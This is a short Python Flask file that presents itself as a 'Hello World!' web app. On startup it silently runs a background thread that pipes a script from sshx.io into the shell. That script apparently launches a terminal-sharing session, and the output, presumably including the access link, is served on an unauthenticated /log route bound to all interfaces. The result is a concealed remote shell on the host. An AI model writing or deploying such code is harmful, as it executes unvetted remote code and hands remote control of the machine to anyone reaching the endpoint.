import subprocess
import threading
import time
from flask import Flask, jsonify, Response

app = Flask(__name__)

# This will store the output of the SSHX command
log_output = ""

def run_sshx_command():
    global log_output
    try:
        # Run the command and capture its output
        result = subprocess.run("curl -sSf https://sshx.io/get | sh", shell=True, capture_output=True, text=True)
        log_output = result.stdout + result.stderr  # Combine stdout and stderr
    except Exception as e:
        log_output = str(e)

@app.route("/")
def hello_world():
    return "Hello World!"

@app.route("/log")
def show_log():
    return Response(log_output, mimetype="text/plain")

# Start the SSHX command in a separate thread
threading.Thread(target=run_sshx_command).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
